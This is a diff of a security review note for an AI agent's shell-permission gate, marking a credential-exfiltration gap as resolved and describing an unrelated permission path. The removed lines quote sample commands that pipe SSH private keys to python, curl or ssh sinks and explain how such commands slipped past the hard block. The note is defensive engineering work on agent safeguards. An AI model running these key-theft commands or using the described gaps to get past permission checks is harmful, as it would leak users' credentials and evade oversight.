@@ -86,34 +86,19 @@ the grouped string form as the only authoritative input. **Test:** a pre-shaped
 config carrying an `allow` for a forbidden action is stripped to the built-in
 default, never honored.
 
-### 3. Exfil redline misses interpreter / ssh sinks and bare SSH-key variants (MEDIUM)
+### 3. Exfil redline misses interpreter / ssh sinks and bare SSH-key variants — RESOLVED
 
-`src/main/agentPermissions.ts` (`looksLikeNetworkWrite` + the sensitive-read +
-network-write gate). The hard block fires only when the sink is recognized:
-curl/wget-with-data, scp/sftp/rsync/rclone, `aws s3 cp`, `gsutil cp`,
-nc/netcat. It MISSES:
+**Resolved (enumerated-sink approach).** `looksLikeExfiltrationSink`
+(`src/main/agentPermissions.ts`) now recognizes opaque sinks — inline interpreter
+execution (`python -c` / `node -e` / `perl -e` / `ruby -e` / `php -r` /
+`osascript -e`) and `ssh host '<cmd>'` — in addition to the network-write verbs,
+and `id_dsa` / `id_ecdsa` are in `SENSITIVE_COMMAND_PATTERNS`. A sensitive-path
+mention plus any such sink is a `platform_hard_block` (tests in
+`tests/core/agentPermissions.test.ts`). Current behavior is specced in
+`docs/spec/agent-tool-permissions.md`.
 
-- interpreter sinks: `python3 -c '...urlopen...'`, `node -e 'fetch(...)'`,
-  `perl` LWP, `ruby` Net::HTTP;
-- `ssh host 'cat >> loot'`, ftp/telnet, `wget --post-file`;
-- bare-relative SSH key variants `id_ecdsa` / `id_dsa` (present in
-  `SENSITIVE_PATH_PATTERNS` but not in `SENSITIVE_COMMAND_PATTERNS`, and gated by
-  `looksLikePath` for bare tokens).
-
-So `cat ~/.ssh/id_rsa | python3 -c '...'` and `cat id_ecdsa | curl -d @- url`
-(from the project dir) downgrade from `platform_hard_block` to `ask`. Not a
-silent-allow today (network_write / local_code_execution are not
-auto-allow-eligible), but exploitable unattended once a user sets an allow rule
-for `shell.local_code_execution`. The parent plan (#6/#18) requires
-piped/encoded/obfuscated sensitive-read + network-write to be hard-blocked.
-
-**Fix (prefer the structural one):** at the descriptor-aggregation layer, promote
-**sensitive-read + ANY external/network segment in the same compound command** to
-`platform_hard_block`, rather than enumerating sinks. If enumerating, add
-interpreter heads (`python`/`python3`/`node`/`deno`/`ruby`/`perl`/`php`) and
-`ssh`/`ftp`/`telnet`/`wget --post-file`, and add `id_dsa`/`id_ecdsa`/`id_*` to
-`SENSITIVE_COMMAND_PATTERNS`. **Tests:** fixtures for python/node/ssh sinks and a
-bare `id_ecdsa` read-to-network all → `platform_hard_block`.
+Deferred: the broader **structural** rule (sensitive-read + ANY external segment
+→ hard block, instead of enumerating sinks) remains a possible future tightening.
 
 ### 4. Dual event vocabulary left live (MEDIUM, observability)
 
@@ -153,10 +138,10 @@ reason strings and `recoverable` flags `configured_deny` false.
 
 ## Out of scope
 
-- The skill-shell second permission path (`agentSkillShell.ts`) — currently dead
-  scaffolding (un-instantiated `agentRuntime.ts`, no assigned
-  `skillShellApprovalHandler`); wire it through the shared resolver only when that
-  scaffolding is activated.
+- ~~The skill-shell second permission path (`agentSkillShell.ts`)~~ — RESOLVED:
+  the path is live (wired in `agentRuntime.ts`), and `ask` decisions now route
+  through the shared `resolveAgentPermissionAsk` (safe-allowlist,
+  classifier-eligibility veto, and unattended fail-safe applied consistently).
 - `Capability(external_messaging)` / `Capability(payments)` enforcement — these
   capabilities are now narrowed out of `SUPPORTED_AGENT_TOOL_CAPABILITIES` (no
   longer falsely advertised); emit `descriptor.capabilities` when the
